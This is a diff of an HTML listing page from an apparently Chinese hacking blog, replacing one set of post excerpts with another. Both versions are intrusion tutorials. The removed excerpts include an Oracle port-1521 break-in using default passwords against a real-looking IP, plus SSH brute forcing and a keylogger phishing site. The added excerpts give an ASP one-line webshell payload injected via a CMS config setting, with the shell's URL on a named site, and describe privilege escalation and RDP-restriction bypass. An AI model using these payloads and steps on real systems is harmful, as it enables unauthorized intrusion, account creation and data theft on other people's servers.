@@ -45,29 +45,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-21T10:26:32.000Z" itemprop="datePublished">
-          2012-06-21
+      <time datetime="2012-12-17T22:28:56.000Z" itemprop="datePublished">
+          2012-12-18
       </time>
     
     
     | 
-    <a href='/tag/1521/'>1521</a>,
-    
-    <a href='/tag/oracle/'>oracle</a>
+    <a href='/tag/一句话/'>一句话</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/557.seo/">入侵1521详细过程</a></h2>
+      <h2 class="post-title"><a href="/956.seo/">马克思cms后台拿webshell方法</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>入侵<a href="http://ha.cker.in/tag/1521" target="_blank">1521</a>详细过程 </p>  <p>工具： </p>  <p>1.<a href="http://ha.cker.in/tag/oracle" target="_blank">oracle</a>精简版(我这已经安装了，这跳过) </p>  <p>2.sqlplus.exe 连接oracle数据库用（oracle里自带） </p>  <p>3.tnscmd.exe&#160;&#160; 查看服务器名字/sid </p>  <p>4.oscanner.exe oracle弱口令猜解工具 </p>  <p>第一步：扫描开了1521端口的服务器，oracle默认1521端口（这步跳过，端口谁都会扫） </p>  <p>第二步：利用tnscmd.exe查看服务器数据库的名字 </p>  <p>从这步开始了，这是刚找好的IP，就用它演示了，“SERVICE_NAME=<strong>*</strong>”这就是我们需要用到的。 </p>  <p>第三步：oscanner.exe猜解弱口令。 </p>  <p>猜解不会太快，呵呵，“DBSNMP/DBSNMP found”发现一个，再让它往下继续猜……“SCOTT/TIGER    <br />found’又一个，猜完了 </p>  <p>第四步：提权（提升oracle用户权限、开3389、添加windows用户） </p>  <p>看操作吧，首先当然是要连接数据库，&quot;已连接。&quot;那就是成功了，呵呵，oracle能猜出很多弱口令，但是 </p>  <p>很多都是低权限的，没法执行命令，所以我们就要提升oracle用户权限，“已选择14行。”权限很低~~~ </p>  <p>需要重新连接数据库，再次查看权限，“已选择140行。”这就可以让我们为所欲为了，呵呵，看到这些顿时兴奋了， </p>  <p>这就是成功执行命令了，“PL/SQL 过程已成功完成。Java 已创建。函数已创建。过程已创建。…….” </p>  <p>脚本里我加了开3389和添加用户……连接它的3389试试…. </p>  <p>熟悉的画面，一台oracle服务器就这么被拿下了，呵呵…….. </p>  <p>这是手工一步步进行的，方便大家了解这一过程，我也有全自动的1521，并非网上所流传的，效果那是相当好，呵呵 </p>  <p>但是不足之处就是，抓的没数量，但有质量！！！呵呵…… </p>  <p>远程接oracle命令：   <br />C:\&gt;sqlplus /nolog    <br />SQL&gt; connect SCOTT/TIGER@(description=(address_list=(address=(protocol=tcp)(host=60.30.73.162)(port=1521)))(connect_data=(SERVICE_NAME=ebestXDB))); </p>  <p>tnscmd用法：tnscmd status -h ip –indent </p>  <p>oscanner用法：oscanner -s ip -v </p>  <p>查看当前用户权限：SELECT PRIVILEGE FROM SESSION_PRIVS; </p>
+        马克思cms后台拿webshell方法  这个方法容易引起出错，如果用这个方法建议用最快的速度给恢复。  系统-》站点配置-》模板与路径设置-》模板文件所在文件夹   html  改为     html&quot;%&gt;&lt;%eval request(&quot;123&quot;)%&gt;&lt;%’ 
+
+点 确认更新得到一句话连接地址：http://www.fst0316.com/max/inc/config.asp
       
       </p>
       
       <p>
-          <a href="/557.seo/" class="excerpt-link">Read More...</a>
+          <a href="/956.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -76,29 +76,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-20T12:14:27.000Z" itemprop="datePublished">
-          2012-06-20
+      <time datetime="2012-12-04T23:11:25.000Z" itemprop="datePublished">
+          2012-12-05
       </time>
     
     
     | 
-    <a href='/tag/Shopex-4-8-5/'>Shopex 4.8.5</a>,
+    <a href='/tag/漏洞/'>漏洞</a>,
     
-    <a href='/tag/后台拿shell/'>后台拿shell</a>
+    <a href='/tag/TCP链路劫持/'>TCP链路劫持</a>,
+    
+    <a href='/tag/ARP/'>ARP</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/539.seo/">Shopex 4.8.5 SQL Injection 注射，后台拿shell</a></h2>
+      <h2 class="post-title"><a href="/949.seo/">链路劫持攻击一二三</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        Shopex 4.8.5 SQL Injection 注射注射注射~【转】   转 t00ls大牛  大牛们 你们还在犹豫神马?&#160; 赶紧发帖啊….&#160; 你们不发&#160; 那只好我来破这个处了   正好这两天电信抽风所以就抽空读了下      漏洞核心函数 \core\model_v5\trading\mdl.goods.php&#160; 由于是zend解密出来的 具体行数就不贴了   01&#160;&#160;
+        博文作者：lake2 [ TSRC ]  发布日期：2012-11-09  博文内容：  随着应用安全的发展，大家都比较关注应用安全漏洞，其实在应用层之下的传输层也有很多安全风险，而且这些安全风险正在被广泛利用。比如今天要给大家介绍的TCP链路劫持攻击。  TCP链路劫持其实就是指网络链路上侦听、伪造TCP包，达到控制目标网络链路的行为。最常见的就是某些设备实现的对非法站点的访问拦截，以及一些地区运营商的网页植入广告行为。  因为广域网
       
       </p>
       
       <p>
-          <a href="/539.seo/" class="excerpt-link">Read More...</a>
+          <a href="/949.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -107,29 +109,103 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-20T12:03:05.000Z" itemprop="datePublished">
-          2012-06-20
+      <time datetime="2012-11-24T12:49:46.000Z" itemprop="datePublished">
+          2012-11-24
       </time>
     
     
     | 
+    <a href='/tag/渗透/'>渗透</a>,
+    
+    <a href='/tag/穿山甲/'>穿山甲</a>,
+    
+    <a href='/tag/盲注/'>盲注</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/948.seo/">从Jannock渗透小米科技(xiaomi.com)说起</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        过年的时候在家无聊，适逢wooyun开站,于是去看了看，居然看到有人12月份发了小米科技渗透的过程。仔细看了看，非常经典的一次渗透过程，其中注入,上传,社工基本上是无缝结合。现在渗透在外面，有些人看来似乎没有什么技术含量，有些人则认为高不可及，那么从这个渗透的案例，我来解答下相关的技术点。看看大家掌握了多少。    首先,作者是从http://xshare.api.xiaomi.com/xShare?do=list2&amp;choic
+      
+      </p>
+      
+      <p>
+          <a href="/948.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-11-21T21:58:30.000Z" itemprop="datePublished">
+          2012-11-22
+      </time>
+    
+    
+    | 
+    <a href='/tag/提权/'>提权</a>,
+    
+    <a href='/tag/漏洞/'>漏洞</a>,
+    
+    <a href='/tag/输入法漏洞/'>输入法漏洞</a>,
+    
+    <a href='/tag/Windows-8/'>Windows 8</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/941.seo/">经典提权漏洞再现 - Win8的远程桌面配合QQ拼音纯净版可以实现提权</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>没有哪个平台是百分之百安全的，虽然微软<a href="http://ha.cker.in/tag/Windows 8" target="_blank">Windows 8</a>在安全方面进行了很大改进，但是仍然不可避免地出现漏洞。<strong>国内博客</strong><strong><a href="http://www.cnblogs.com/maybreath/archive/2012/11/20/2778875.html">MayBreath</a></strong><strong>就在</strong><strong>Windows 8</strong><strong>上再现了曾经出现过的<a href="http://ha.cker.in/tag/输入法漏洞" target="_blank">输入法漏洞</a>，利用</strong><strong>QQ</strong><strong>拼音实现了<a href="http://ha.cker.in/tag/提权" target="_blank">提权</a>，具体来看一下</strong>：</p>  <p>发现这个漏洞的时候，笔者正在机房上课。正想用3389远程桌面去控制宿舍电脑的时候，因为重做系统忘记自己的IP地址，因此就随手扫描了一下IP段开3389端口的电脑。</p>  <p>没想到就随手扫描到一台Win8的系统，而且这个系统还装了QQ输入法Win8纯净版。</p>  <p>当时我就想起初中时候的那个极品五笔的漏洞，就随手测试了一下，没想到在时隔7、8年后的今天，号称非常安全的Win8系统居然还有如此大的<a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>。这边就把<a href="http://ha.cker.in/tag/提权" target="_blank">提权</a>过程理一遍。</p>  <p>首先确认装有这个QQ拼音输入法：</p>  <p><a href="http://img.cker.in/Win8QQ_C37E/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Win8QQ_C37E/clip_image001_thumb.jpg" width="620" height="471" /></a></p>  <p>Ctrl+空格调出托盘，找到这个选项：</p>  <p><a href="http://img.cker.in/Win8QQ_C37E/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/Win8QQ_C37E/clip_image002_thumb.jpg" width="620" height="462" /></a></p>  <p>顺利开启IE浏览器：</p>  <p><a href="http://img.cker.in/Win8QQ_C37E/clip_image003.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/Win8QQ_C37E/clip_image003_thumb.jpg" width="620" height="468" /></a></p>  <p>需要说明的是，<strong>IE</strong><strong>浏览器和</strong><strong>Win8</strong><strong>安全性确实是提高了非常多</strong>。随手在地址栏输入D:\ file://d: 这样的命令都无法打开文件夹，本以为只要随便上传一个bat批处理，写上提权用的命令，然后利用IE下载下来打开运行即可，没想到各种提示系统要求验证您的用户密码等，根本无法进行下载，可见<strong>常规方式真的行不通</strong>。</p>  <p>微软还是有在修复这些漏洞，但是经过笔者的诸多尝试，最终发现有一处漏洞尚未填补。</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/941.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-11-05T06:38:54.000Z" itemprop="datePublished">
+          2012-11-05
+      </time>
+    
+    
+    | 
+    <a href='/tag/xss/'>xss</a>,
+    
+    <a href='/tag/注入/'>注入</a>,
+    
     <a href='/tag/注入漏洞/'>注入漏洞</a>,
     
-    <a href='/tag/关于IN方式的注入漏洞/'>关于IN方式的注入漏洞</a>
+    <a href='/tag/上传漏洞/'>上传漏洞</a>,
+    
+    <a href='/tag/暴库/'>暴库</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/534.seo/">关于IN方式的注入漏洞</a></h2>
+      <h2 class="post-title"><a href="/926.seo/">年终了，谈点个人入侵的经验〈转载〉</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        By jmdcw    曾多次写过关于IN方式的注入，可能程序员并不看俺的文章，所以嘛。。。。今天受小林之托，在看一段源码时，又见到了这个漏洞，闲来无事，就来现一下吧，高手请飘过。    &#160;&#160;&#160;&#160;&#160; 一般IN方式的利用代码如下：    dim id    id=request.form(&quot;id&quot;)    Conn.Execute(&quot;delect from 表
+        by 老君   这一年变化比较大，换了好几个工作，最终还是回到了安全的岗位，合乎自己的职业规划！    平时空闲时间经常找些站练练手，基本是新闻闹出轰动的站与一些知名的大站。2008年的成果还是颇丰的，从某某国内2大知名社区论坛到某某著名交友站到某某 2大读书站到某某mobile到某某政府站等大站，再到若干名不见经传的小站，都闪过的我的影踪。但我个人觉得没什么好炫耀的，于是没替换首页，没留下黑页，顶多是把源代码打包带回家（硬盘吃不消了，
       
       </p>
       
       <p>
-          <a href="/534.seo/" class="excerpt-link">Read More...</a>
+          <a href="/926.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -138,93 +214,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-14T05:06:31.000Z" itemprop="datePublished">
-          2012-06-14
+      <time datetime="2012-10-30T21:41:03.000Z" itemprop="datePublished">
+          2012-10-31
       </time>
     
     
     | 
-    <a href='/tag/Metasploit/'>Metasploit</a>,
-    
-    <a href='/tag/ssh/'>ssh</a>
+    <a href='/tag/SecureRDP/'>SecureRDP</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/527.seo/">利用metasploit的ssh模块破解ssh口令</a></h2>
+      <h2 class="post-title"><a href="/916.seo/">调戏突破SecureRDP对远程桌面连接的限制</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><a href="http://ha.cker.in/tag/Metasploit" target="_blank">Metasploit</a>软件一般我们都是用来进行溢出什么的，在看了一个国外的一个人的blog上的关于msf的技巧，发现msf还可以进行远程ssh帐号口令的破解。    <br />Msf的ssh远程帐号口令模块默认就有，使用方法如下：    <br />Msf&gt;use auxiliary/scanner/ssh/ssh_login&#160; <br />加载ssh_login模块</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/metasploitsshssh_1251C/clip_image001.jpg" width="781" height="466" /></p>  <p></p>
+        <p>缘起自某群某孩纸遇到的一案例！</p>  <p>连接远程桌面的时候服务器出现如下提示：</p>  <p>You are not allowed to access to this Terminal Server. Please contact your administrator for more information. Secured by SecureRDP.</p>  <p>仔细一看不是远程管理组的问题，而是<a href="http://ha.cker.in/tag/SecureRDP" target="_blank">SecureRDP</a>这个软件搞的鬼，网上一搜，    <br />好家伙，这个软件的功能如下：</p>  <p><a href="http://ha.cker.in/tag/SecureRDP" target="_blank">secureRDP</a>是一款用户登录服务器管理软件。防止非法用户试图暴力破解用户密码；可以过滤IP/MAC地址、计算机名等。具体有以下功能：     <br />1.连接限制 允许按照登陆时间，IP地址，主机名，MAC地址，Client版本等信息作连接</p>  <p><a href="http://pkav.net/wp-content/uploads/2012/10/1.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/SecureRDP_BF77/clip_image002.jpg" width="660" height="506" /></a></p>  <p>看来是对客户端的连接做了限制了，现在流行的D盾和安全狗都有这样的功能！   <br />着实第一次见这个软件，好奇心也来了，也想顺便帮这位童鞋一把，下了软件    <br />虚拟机装好，配置好限制ip，一看软件目录，依然只有这几个文件，那么他的配置要么    <br />是写入其他目录了，要么写到注册表里面啦！</p>  <p><a href="http://pkav.net/wp-content/uploads/2012/10/2.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/SecureRDP_BF77/clip_image003.png" width="389" height="542" /></a></p>  <p>想想之前调试的某狗。Od打开，加载软件   <br />Aspack壳无视之，运行起软件，直接下好注册表API断点RegOpenKeyExA，直接保存配置    <br />断点断下了，注册表的路径显示出来了    <br />HKEY_LOCAL_MACHINE\Software\Terminalsoft\WTSFilter</p>  <p><a href="http://img.cker.in/SecureRDP_BF77/clip_image005.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/SecureRDP_BF77/clip_image005_thumb.jpg" width="660" height="439" /></a></p>  <p>跑到注册表里面一看，果然是这个   <br />邪恶的直接把WTSFilter项给删除了</p>  <p><a href="http://img.cker.in/SecureRDP_BF77/clip_image007.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007" border="0" alt="clip_image007" src="http://img.cker.in/SecureRDP_BF77/clip_image007_thumb.jpg" width="660" height="522" /></a></p>  <p><a href="http://img.cker.in/SecureRDP_BF77/clip_image009.jpg" target="_blank"></a></p><br>
       
       </p>
       
       <p>
-          <a href="/527.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-13T22:52:02.000Z" itemprop="datePublished">
-          2012-06-14
-      </time>
-    
-    
-    | 
-    <a href='/tag/Metasploit/'>Metasploit</a>,
-    
-    <a href='/tag/窃听/'>窃听</a>,
-    
-    <a href='/tag/网络钓鱼/'>网络钓鱼</a>,
-    
-    <a href='/tag/keylogger/'>keylogger</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/519.seo/">如何利用Metasploit制造一个键盘窃听网站</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><b>大家都应该知道网络钓鱼是什么吧，那么接下来这篇文章会来讲述如何利用</b><b>Metasploit</b><b>制造一个键盘窃听网站。</b></p>  <p><b>网络钓鱼的历史：</b></p>  <p>网络钓鱼技术始于1987年，于1995年被第一次发现。</p>  <p>攻击者通过钓鱼技术获取受害者的一些信息，包括用户名、密码、信用卡细节等等。   <br />一般来说，攻击者会制造一个假冒的网站诱惑受害者进入并输入他的信息，比如仿造gmail、雅虎、facebook的登录框。</p>  <p><b>Javascript keylogger</b><b>简介：</b></p>  <p>Javascript keylogger可以捕捉通过网络的键盘击键事件。   <br />使用JavaScript keylogger的优势在于：他不需要我们预先拥有一个服务器空间，然后再上传一个假冒的网页，写伪造的页面、插链接</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[4]" border="0" alt="clip_image001[4]" src="http://img.cker.in/Metasploit_D0E0/clip_image0014.png" width="541" height="231" /></p>  <p>再写个蛋疼的采集脚本（如下图）…<img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[4]" border="0" alt="clip_image002[4]" src="http://img.cker.in/Metasploit_D0E0/clip_image0024.png" width="585" height="144" /></p>  <p><b>使用</b><b>Metasploit</b><b>制造键盘窃听网站：</b></p>  <p>1. 打开msfconsle</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[4]" border="0" alt="clip_image004[4]" src="http://img.cker.in/Metasploit_D0E0/clip_image0044.jpg" width="558" height="356" /></p>
-      
-      </p>
-      
-      <p>
-          <a href="/519.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-13T09:01:56.000Z" itemprop="datePublished">
-          2012-06-13
-      </time>
-    
-    
-    | 
-    <a href='/tag/Group-By一个不常用的用法/'>Group By一个不常用的用法</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/514.seo/">Group By一个不常用的用法</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>乍一看，大家一定认为这有什么好写的呀，不就是group by 嘛，对指定列进行分组而已。我在这里说的是一个将被MS删除、不符合ISO语法的用法（大家可以在MS没有删除前显摆显摆嘛，至少2008没有删除）。好，那这是什么语法呢，那就是Group by ALL 。那它和不加ALL有什么差别呢？ 差别就是加了ALL后包含所有组和结果集，甚至包含那些其中任何行都不满足 WHERE 子句指定的搜索条件的组和结果集。注意的是指定了 ALL，将对组中不满足搜索条件的汇总列返回空值。 </p>
-      
-      </p>
-      
-      <p>
-          <a href="/514.seo/" class="excerpt-link">Read More...</a>
+          <a href="/916.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -232,7 +242,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/category/黑客技巧/page/5/">← Newer Posts</a>
-    <span class="page-number">Page 6 of 10</span>
+    <span class="page-number">Page 6 of 13</span>
     <a class="older-posts" href="/category/黑客技巧/page/7/">Older Posts →</a>
   </nav>
 </main>
